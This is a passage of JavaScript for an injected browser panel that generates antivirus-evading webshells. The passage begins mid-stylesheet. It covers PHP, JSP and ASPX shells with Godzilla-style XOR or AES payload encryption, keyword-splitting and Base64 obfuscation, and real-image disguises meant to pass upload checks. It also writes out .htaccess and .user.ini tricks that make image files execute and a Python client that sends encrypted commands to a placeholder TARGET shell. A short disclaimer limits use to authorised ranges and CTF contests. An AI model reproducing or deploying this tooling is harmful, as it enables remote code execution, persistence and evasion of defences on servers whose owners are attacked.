      'padding:4px 12px;cursor:pointer;font-size:12px}' +
      '#lp-tp-close:hover{color:#ff4d4f;border-color:#ff4d4f}' +
      '.lp-tp-row{display:flex;flex-wrap:wrap;gap:10px;align-items:center;padding:9px 14px;border-bottom:1px solid #222a32}' +
      '.lp-tp-row label{color:#8b98a5;font-size:12px}' +
      '#lp-tp select,#lp-tp input[type=text]{background:#0b0f13;border:1px solid #2a323b;color:#e6edf3;' +
      'border-radius:6px;padding:5px 8px;font-size:12px;outline:none}' +
      '#lp-tp select:focus,#lp-tp input[type=text]:focus{border-color:#1890ff}' +
      '#lp-tp select:disabled,#lp-tp input:disabled{opacity:.4}' +
      '.lp-tp-btn{background:#1890ff;border:0;color:#fff;border-radius:6px;padding:6px 14px;cursor:pointer;font-size:12px}' +
      '.lp-tp-btn:hover{background:#40a9ff}' +
      '.lp-tp-btn.ghost{background:transparent;border:1px solid #2a323b;color:#c9d4de}' +
      '.lp-tp-btn.ghost:hover{border-color:#1890ff;color:#1890ff}' +
      '#lp-tp-info{padding:6px 14px;color:#8b98a5;font-size:12px;border-bottom:1px solid #222a32}' +
      '#lp-tp-body{flex:1 1 auto;display:flex;min-height:0}' +
      '#lp-tp-code{flex:1 1 auto;background:#0b0f13;border:0;color:#d6dee6;padding:12px;font-size:12px;' +
      'font-family:ui-monospace,Menlo,Consolas,monospace;resize:none;outline:none;white-space:pre;overflow:auto}' +
      '#lp-tp-side{flex:0 0 330px;border-left:1px solid #222a32;padding:12px;overflow:auto;color:#8b98a5;font-size:12px}' +
      '#lp-tp-side h4{color:#c9d4de;font-size:12px;margin:14px 0 6px}' +
      '#lp-tp-side h4:first-child{margin-top:0}' +
      '#lp-tp-side li{margin:3px 0;line-height:1.5}' +
      '#lp-tp-side code{color:#52c41a;font-family:ui-monospace,Menlo,monospace}' +
      '#lp-tp-hex{background:#080b0e;border:1px solid #222a32;border-radius:6px;padding:6px 8px;margin:0;' +
      'font:11px/1.45 ui-monospace,Menlo,monospace;color:#8b98a5;overflow:auto;white-space:pre}' +
      '#lp-tp-foot{flex:0 0 auto;padding:10px 14px;border-top:1px solid #2a323b;display:flex;gap:8px;flex-wrap:wrap;' +
      'align-items:center;background:#141a20}' +
      '#lp-tp-thumb{max-width:64px;max-height:64px;border:1px solid #2a323b;border-radius:6px;background:#fff}' +
      '.lp-tp-tag{display:inline-block;padding:0 6px;border-radius:4px;font-size:11px;line-height:17px;' +
      'background:#14251a;color:#52c41a;margin-right:4px}';
  }

  function ensureUI() {
    if (document.getElementById('lp-tp')) return;
    var st = document.createElement('style');
    st.textContent = css();
    document.head.appendChild(st);

    var wrap = document.createElement('div');
    wrap.id = 'lp-tp';
    wrap.innerHTML = '' +
      '<div id="lp-tp-box">' +
      '  <div id="lp-tp-bar"><b>🛡 木马免杀生成器 v2 · 加密载荷 / 真实图片马</b><button id="lp-tp-close">关闭 ✕</button></div>' +
      '  <div class="lp-tp-row">' +
      '    <label>语言</label><select id="lp-tp-lang">' +
      '      <option value="php">PHP</option><option value="jsp">JSP</option><option value="aspx">ASPX</option>' +
      '    </select>' +
      '    <label>功能</label><select id="lp-tp-kind">' +
      '      <option value="godzilla">加密载荷（哥斯拉级 / 任意 PHP）</option>' +
      '      <option value="eval">代码执行（蚁剑 / LingOps 兼容）</option>' +
      '      <option value="cmd">命令执行</option>' +
      '      <option value="dual">代码 + 命令双模式</option>' +
      '      <option value="file">文件管理器</option>' +
      '      <option value="db">数据库操作（MySQL）</option>' +
      '      <option value="info">信息收集（phpinfo 摘要）</option>' +
      '    </select>' +
      '    <label>免杀等级</label><select id="lp-tp-level">' +
      '      <option value="1">1 · 基础（关键字拆分）</option>' +
      '      <option value="2" selected>2 · 进阶（函数名拆分 + 随机变量）</option>' +
      '      <option value="3">3 · 极限（整体 Base64 + eval 还原）</option>' +
      '    </select>' +
      '    <label>参数名</label><input id="lp-tp-param" type="text" value="pass" style="width:100px">' +
      '    <button class="lp-tp-btn ghost" id="lp-tp-rand" title="随机生成参数名">随机</button>' +
      '  </div>' +
      '  <div class="lp-tp-row" style="border-top:0;padding-top:0">' +
      '    <label>加密</label><select id="lp-tp-crypto">' +
      '      <option value="xor">XOR + Base64（哥斯拉兼容）</option>' +
      '      <option value="aes">AES-128-CBC + Base64</option>' +
      '      <option value="base64">Base64</option>' +
      '      <option value="none">明文（不加密）</option>' +
      '    </select>' +
      '    <label>密钥</label><input id="lp-tp-key" type="text" style="width:150px" maxlength="16" spellcheck="false">' +
      '    <button class="lp-tp-btn ghost" id="lp-tp-keyrand" title="随机 16 位密钥">随机</button>' +
      '    <label>伪装</label><select id="lp-tp-mask">' +
      '      <option value="none">不伪装（纯代码）</option>' +
      '      <option value="gif">GIF 图片马（64×64 真图）</option>' +
      '      <option value="png">PNG 图片马（128×128 真图）</option>' +
      '      <option value="jpg">JPG 图片马（128×128 真图）</option>' +
      '      <option value="ico">ICO 图标马（256×256 真图）</option>' +
      '      <option value="bmp">BMP 图片马（64×64 真图）</option>' +
      '      <option value="custom">自定义图片 / 图标…</option>' +
      '    </select>' +
      '    <input id="lp-tp-file" type="file" accept="image/*,.ico" style="display:none">' +
      '    <img id="lp-tp-thumb" style="display:none" alt="">' +
      '    <label>文件名</label><input id="lp-tp-name" type="text" value="shell.php" style="width:150px">' +
      '    <button class="lp-tp-btn" id="lp-tp-gen">生成</button>' +
      '  </div>' +
      '  <div id="lp-tp-info">—</div>' +
      '  <div id="lp-tp-body">' +
      '    <textarea id="lp-tp-code" spellcheck="false" wrap="off"></textarea>' +
      '    <div id="lp-tp-side"></div>' +
      '  </div>' +
      '  <div id="lp-tp-foot">' +
      '    <button class="lp-tp-btn" id="lp-tp-dl">下载木马</button>' +
      '    <button class="lp-tp-btn ghost" id="lp-tp-copy">复制代码</button>' +
      '    <button class="lp-tp-btn ghost" id="lp-tp-b64">复制整文件 Base64</button>' +
      '    <button class="lp-tp-btn ghost" id="lp-tp-ht">.htaccess</button>' +
      '    <button class="lp-tp-btn ghost" id="lp-tp-ini">.user.ini</button>' +
      '    <button class="lp-tp-btn ghost" id="lp-tp-py">连接脚本 .py</button>' +
      '    <button class="lp-tp-btn ghost" id="lp-tp-self">自检脚本 .php</button>' +
      '    <span style="color:#6b7684;font-size:11px;margin-left:auto">纯前端生成 · 不联网</span>' +
      '  </div>' +
      '</div>';
    document.body.appendChild(wrap);

    ui.wrap = wrap;
    ui.lang = wrap.querySelector('#lp-tp-lang');
    ui.kind = wrap.querySelector('#lp-tp-kind');
    ui.level = wrap.querySelector('#lp-tp-level');
    ui.crypto = wrap.querySelector('#lp-tp-crypto');
    ui.param = wrap.querySelector('#lp-tp-param');
    ui.key = wrap.querySelector('#lp-tp-key');
    ui.mask = wrap.querySelector('#lp-tp-mask');
    ui.file = wrap.querySelector('#lp-tp-file');
    ui.thumb = wrap.querySelector('#lp-tp-thumb');
    ui.name = wrap.querySelector('#lp-tp-name');
    ui.code = wrap.querySelector('#lp-tp-code');
    ui.info = wrap.querySelector('#lp-tp-info');
    ui.side = wrap.querySelector('#lp-tp-side');

    wrap.querySelector('#lp-tp-close').onclick = close;
    wrap.addEventListener('click', function (e) { if (e.target === wrap) close(); });

    ui.lang.onchange = function () { S.lang = ui.lang.value; ui.name.value = defaultName(); syncCrypto(); build(); };
    ui.kind.onchange = function () { S.kind = ui.kind.value; syncCrypto(); build(); };
    ui.level.onchange = function () { S.level = Number(ui.level.value); build(); };
    ui.crypto.onchange = function () { S.crypto = ui.crypto.value; build(); };
    ui.param.onchange = function () { build(); };
    ui.key.onchange = function () { build(); };
    ui.name.onchange = function () { S.name = ui.name.value.trim() || defaultName(); build(); };
    ui.mask.onchange = function () {
      S.mask = ui.mask.value;
      if (S.mask === 'custom') { ui.file.click(); }
      else { S.custom = null; S.customUrl = ''; }
      ui.name.value = defaultName();
      S.name = ui.name.value;
      build();
    };
    ui.file.onchange = function () {
      var f = ui.file.files && ui.file.files[0];
      if (!f) return;
      var rd = new FileReader();
      rd.onload = function () {
        S.custom = new Uint8Array(rd.result);
        S.customName = f.name;
        if (S.customUrl) URL.revokeObjectURL(S.customUrl);
        S.customUrl = URL.createObjectURL(f);
        var switched = S.mask !== 'custom';
        S.mask = 'custom';
        ui.mask.value = 'custom';
        if (switched) { ui.name.value = defaultName(); S.name = ui.name.value; }
        build();
        toast('已载入图标：' + f.name + '（' + S.custom.length + ' 字节）');
      };
      rd.readAsArrayBuffer(f);
    };
    wrap.querySelector('#lp-tp-rand').onclick = function () { ui.param.value = ri(5); build(); };
    wrap.querySelector('#lp-tp-keyrand').onclick = function () { ui.key.value = randKey(); build(); };
    wrap.querySelector('#lp-tp-gen').onclick = function () { build(); toast('已重新生成'); };
    wrap.querySelector('#lp-tp-dl').onclick = download;
    wrap.querySelector('#lp-tp-copy').onclick = function () {
      navigator.clipboard.writeText(ui.code.value).then(function () { toast('代码已复制'); });
    };
    wrap.querySelector('#lp-tp-b64').onclick = function () {
      navigator.clipboard.writeText(u8ToB64(S.bytes || new Uint8Array())).then(function () {
        toast('整文件 Base64 已复制（' + (S.bytes || []).length + ' 字节）');
      });
    };
    wrap.querySelector('#lp-tp-ht').onclick = function () { downloadText('.htaccess', htaccess()); };
    wrap.querySelector('#lp-tp-ini').onclick = function () { downloadText('.user.ini', userini()); };
    wrap.querySelector('#lp-tp-py').onclick = function () { downloadText('connect.py', connectScript()); };
    wrap.querySelector('#lp-tp-self').onclick = function () { downloadText('selftest.php', selfTest()); };

    ui.code.addEventListener('input', function () {
      S.code = ui.code.value;
      var u = new TextEncoder().encode(S.code);
      var mb = maskBytes();
      if (mb && mb.length) {
        S.bytes = new Uint8Array(mb.length + u.length);
        S.bytes.set(mb, 0); S.bytes.set(u, mb.length);
      } else S.bytes = u;
      if (ui.hex) ui.hex.textContent = hexDump(S.bytes, 96);
    });

    renderSide();
    syncCrypto();
  }

  function syncCrypto() {
    var phpGod = (S.lang === 'php' && S.kind === 'godzilla');
    if (ui.crypto) ui.crypto.disabled = !phpGod;
    if (ui.key) ui.key.disabled = !phpGod;
    var kr = document.getElementById('lp-tp-keyrand');
    if (kr) kr.disabled = !phpGod;
  }

  function renderSide() {
    ui.side.innerHTML = '' +
      '<h4>文件头（真实字节）</h4>' +
      '<div id="lp-tp-hexhead" style="font-size:11px;margin-bottom:4px;color:#8b98a5">—</div>' +
      '<pre id="lp-tp-hex">—</pre>' +
      '<h4>加密通信</h4>' +
      '<ul style="padding-left:16px;margin:0">' +
      '<li><span class="lp-tp-tag">XOR</span>Base64 + 16 字节密钥异或，与哥斯拉 <code>PHP_XOR_BASE64</code> 同构</li>' +
      '<li><span class="lp-tp-tag">AES</span>AES-128-CBC + Base64，需 PHP <code>openssl</code> 扩展</li>' +
      '<li><span class="lp-tp-tag">B64</span>仅 Base64，绕明文关键字</li>' +
      '</ul>' +
      '<h4>免杀等级</h4>' +
      '<ul style="padding-left:16px;margin:0">' +
      '<li><span class="lp-tp-tag">L1</span>关键字拆分 <code>\'eV\'.al\'</code></li>' +
      '<li><span class="lp-tp-tag">L2</span>函数名变量化 + 随机变量名 + 诱饵注释</li>' +
      '<li><span class="lp-tp-tag">L3</span>整体 Base64，静态扫描看不到业务关键字</li>' +
      '</ul>' +
      '<h4>真实图片马</h4>' +
      '<p style="margin:0">图片是 canvas 现画的 <b>64/128/256 像素</b>盾牌图标，<br>' +
      '不是 1×1 透明点。可绕过 <code>getimagesize()</code> / <code>exif_imagetype()</code>。</p>' +
      '<div id="lp-tp-conn"></div>' +
      '<h4>配套文件</h4>' +
      '<p style="margin:0">图片马不解析时上传同目录 <code>.htaccess</code>（Apache）<br>或 <code>.user.ini</code>（PHP-FPM / Nginx）。</p>' +
      '<h4>使用边界</h4>' +
      '<p style="margin:0;color:#f59e0b">仅可用于授权靶场 / CTF / AWD 比赛。<br>禁止用于未授权系统。</p>';
    ui.hex = ui.side.querySelector('#lp-tp-hex');
    ui.hexHead = ui.side.querySelector('#lp-tp-hexhead');
    ui.conn = ui.side.querySelector('#lp-tp-conn');
  }

  function htaccess() {
    var ext = S.lang === 'php' ? '.php' : (S.lang === 'jsp' ? '.jsp' : '.aspx');
    var lines = [
      '# 让伪装文件按脚本执行（Apache + mod_php）',
      'AddType application/x-httpd-php ' + ext + ' .jpg .png .gif .ico .bmp',
      'AddHandler application/x-httpd-php ' + ext + ' .jpg .png .gif .ico .bmp',
      '',
      '# 关掉目录列表（可选）',
      'Options -Indexes'
    ];
    return lines.join('\n') + '\n';
  }

  function userini() {
    return '# 让伪装文件被 PHP 预包含（PHP-FPM / Nginx + fastcgi）\n' +
      'auto_prepend_file=' + S.name + '\n';
  }

  function connectScript(opts) {
    opts = opts || {};
    var crypto = opts.crypto || S.crypto;
    var name = opts.name || S.name;
    var param = safeParam(opts.param || (ui.param ? ui.param.value : 'pass'));
    var key = safeKey(opts.key || (ui.key ? ui.key.value : S.key));
    var L = [];
    L.push('#!/usr/bin/env python3');
    L.push('# LingOps 木马连接脚本（' + cryptoLabel(crypto) + '）');
    L.push('# 用法: python3 connect.py "echo php_uname();"');
    L.push('import base64, hashlib, subprocess, sys, urllib.parse, urllib.request');
    L.push('');
    L.push('URL  = "http://TARGET' + (name.charAt(0) === '/' ? name : '/' + name) + '"');
    L.push('PASS = "' + param + '"');
    L.push('KEY  = "' + key + '"');
    L.push('');
    if (crypto === 'base64') {
      L.push('MARK = hashlib.md5(PASS.encode()).hexdigest()');
    } else if (crypto === 'none') {
      L.push('MARK = ""');
    } else {
      L.push('MARK = hashlib.md5((PASS + KEY).encode()).hexdigest()');
    }
    L.push('');
    L.push('def unwrap(raw):');
    L.push('    """去掉图片头 / 空白，并按 md5 标记截取载荷"""');
    L.push('    if not MARK:');
    L.push('        return raw.strip()');
    L.push('    i = raw.find(MARK[:16])');
    L.push('    if i >= 0:');
    L.push('        j = raw.find(MARK[16:], i + 16)');
    L.push('        if j > i:');
    L.push('            return raw[i + 16:j]');
    L.push('    return raw.strip()');
    L.push('');
    if (crypto === 'xor') {
      L.push('def xor(d, k):');
      L.push('    return bytes(c ^ ord(k[(i + 1) & 15]) for i, c in enumerate(d))');
      L.push('');
      L.push('def enc(code):');
      L.push('    return base64.b64encode(xor(code.encode(), KEY)).decode()');
      L.push('');
      L.push('def dec(raw):');
      L.push('    return xor(base64.b64decode(unwrap(raw)), KEY).decode("utf-8", "replace")');
    } else if (crypto === 'aes') {
      L.push('def _iv():');
      L.push('    return hashlib.md5(KEY.encode()).hexdigest()[:16]');
      L.push('');
      L.push('def _openssl(data, decrypt=False):');
      L.push('    cmd = ["openssl", "enc"] + (["-d"] if decrypt else []) + [');
      L.push('        "-aes-128-cbc", "-K", KEY.encode().hex(), "-iv", _iv().encode().hex(), "-nosalt"]');
      L.push('    return subprocess.run(cmd, input=data, capture_output=True, check=True).stdout');
      L.push('');
      L.push('def enc(code):');
      L.push('    return base64.b64encode(_openssl(code.encode())).decode()');
      L.push('');
      L.push('def dec(raw):');
      L.push('    return _openssl(base64.b64decode(unwrap(raw)), True).decode("utf-8", "replace")');
    } else if (crypto === 'base64') {
      L.push('def enc(code):');
      L.push('    return base64.b64encode(code.encode()).decode()');
      L.push('');
      L.push('def dec(raw):');
      L.push('    return base64.b64decode(unwrap(raw)).decode("utf-8", "replace")');
    } else {
      L.push('def enc(code):');
      L.push('    return code');
      L.push('');
      L.push('def dec(raw):');
      L.push('    return raw');
    }
    L.push('');
    L.push('def main():');
    L.push('    code = sys.argv[1] if len(sys.argv) > 1 else "echo \'OK:\'.php_uname();"');
    L.push('    body = urllib.parse.urlencode({PASS: enc(code)}).encode()');
    L.push('    req = urllib.request.Request(URL, data=body, headers={"User-Agent": "Mozilla/5.0"})');
    L.push('    # 显式禁用系统代理，避免本地/内网目标被代理拦成 502');
    L.push('    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))');
    L.push('    with opener.open(req, timeout=15) as r:');
    L.push('        raw = r.read().decode("utf-8", "replace")');
    L.push('    print(dec(raw))');
    L.push('');
    L.push('if __name__ == "__main__":');
    L.push('    main()');
    return L.join('\n') + '\n';
  }

  function selfTest() {
    var key = safeKey(ui.key ? ui.key.value : S.key);
    var param = safeParam(ui.param ? ui.param.value : 'pass');
    var L = [];
    L.push('<?php');
    L.push('/* 本地自检：验证生成的马加解密往返是否一致（不上传、不联网） */');
    L.push('$key = ' + "'" + key + "';");
    L.push('$pass = ' + "'" + param + "';");
    L.push('');
    if (S.crypto === 'xor') {
      L.push('function enc($D, $K) { for ($i = 0; $i < strlen($D); $i++) { $c = $K[$i + 1 & 15]; $D[$i] = $D[$i] ^ $c; } return $D; }');
      L.push('$code = "echo \'ROUNDTRIP_OK\';";');
      L.push('$wire = base64_encode(enc($code, $key));');
      L.push('$back = enc(base64_decode($wire), $key);');
      L.push('echo $back === $code ? "[OK] XOR 加解密往返一致\\n" : "[FAIL] 往返不一致\\n";');
      L.push('echo "wire=" . $wire . "\\n";');
    } else if (S.crypto === 'aes') {
      L.push('if (!function_exists("openssl_encrypt")) { echo "[FAIL] 缺少 openssl 扩展\\n"; exit; }');
      L.push('$iv = substr(md5($key), 0, 16);');
      L.push('$code = "echo \'ROUNDTRIP_OK\';";');
      L.push('$wire = base64_encode(openssl_encrypt($code, "AES-128-CBC", $key, OPENSSL_RAW_DATA, $iv));');
      L.push('$back = openssl_decrypt(base64_decode($wire), "AES-128-CBC", $key, OPENSSL_RAW_DATA, $iv);');
      L.push('echo $back === $code ? "[OK] AES 加解密往返一致\\n" : "[FAIL] 往返不一致\\n";');
      L.push('echo "wire=" . $wire . "\\n";');
    } else if (S.crypto === 'base64') {
      L.push('$code = "echo \'ROUNDTRIP_OK\';";');
      L.push('$wire = base64_encode($code);');
      L.push('echo base64_decode($wire) === $code ? "[OK] Base64 往返一致\\n" : "[FAIL]\\n";');
    } else {
      L.push('echo "[OK] 明文模式，无需解密\\n";');
    }
    L.push('');
    L.push('/* 用 curl 实测（把 URL 换成你的马地址）：');
    L.push('   curl -s -d "' + param + '=' + '$(php -r \'echo base64_encode("echo 123;");\')' + '" http://TARGET/shell.php');
    L.push('*/');
    L.push('?>');
    return L.join('\n') + '\n';
  }

  function download() {
    if (!S.bytes || !S.bytes.length) { toast('请先生成', '#ff4d4f'); return; }
    var blob = new Blob([S.bytes], { type: 'application/octet-stream' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = S.name || defaultName();
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(function () { URL.revokeObjectURL(url); }, 4000);
    toast('已下载 ' + a.download + '（' + S.bytes.length + ' 字节）');
  }

  function downloadText(name, text) {
    var blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url; a.download = name;
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    setTimeout(function () { URL.revokeObjectURL(url); }, 4000);
    toast('已下载 ' + name);
  }

  function open() {
    ensureUI();
    ui.wrap.style.display = 'flex';
    S.lang = ui.lang.value; S.kind = ui.kind.value; S.level = Number(ui.level.value);
    S.crypto = ui.crypto.value;
    S.mask = ui.mask.value;
    if (!S.key) { S.key = randKey(); ui.key.value = S.key; }
    if (!ui.key.value) ui.key.value = S.key;
    ui.name.value = S.name || defaultName();
    syncCrypto();
    build();
  }

  function close() { if (ui.wrap) ui.wrap.style.display = 'none'; }

  /* ---------- 入口 ---------- */

  function addPageButton() {
    if (!/^\/attack\/trojan(\/|$|\?)/.test(location.pathname)) return;
    if (document.getElementById('lp-tp-pagebtn')) return;
    var btns = [].slice.call(document.querySelectorAll('button'));
    var target = null;
    for (var i = 0; i < btns.length; i++) {
      if (btns[i].textContent.trim() === '下载木马') { target = btns[i]; break; }
    }
    if (!target || !target.parentNode) return;
    var b = document.createElement('button');
    b.id = 'lp-tp-pagebtn';
    b.type = 'button';
    b.textContent = '🛡 免杀生成器';
    b.className = target.className || 'ant-btn ant-btn-default';
    b.style.cssText = 'margin-left:8px;border-color:#52c41a;color:#52c41a';
    b.onclick = open;
    target.parentNode.insertBefore(b, target.nextSibling);
  }

  // DOM 一变就重试注入：React 渲染完当帧就能出按钮，不用等 2 秒轮询
  function watchDom(fn) {
    var queued = false;
    function run() {
      queued = false;
      try { fn(); } catch (e) { console.warn('[trojanplus] 注入失败', e); }
    }
    function kick() {
      if (queued) return;
      queued = true;
      if (window.requestAnimationFrame) window.requestAnimationFrame(run);
      else setTimeout(run, 16);
    }
    run();
    if (window.MutationObserver) {
      try {
        new MutationObserver(kick).observe(document.documentElement, { childList: true, subtree: true });
      } catch (e) { /* 老浏览器退回轮询 */ }
    }
    setInterval(run, 5000); // 兜底：没有 DOM 变化时也补齐
  }

  function boot() {
    watchDom(addPageButton);
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
  else boot();

  window.__lpTrojanPlusOpen = open;
  window.__lpTrojanPlusState = S;
  window.__lpTrojanPlusGen = {
    php: phpShell, jsp: jspShell, aspx: aspxShell,
    maskBytes: maskBytes, htaccess: htaccess, userini: userini,
    connectScript: connectScript, selfTest: selfTest,
    hexDump: hexDump, headerInfo: headerInfo, randKey: randKey
  };
})();
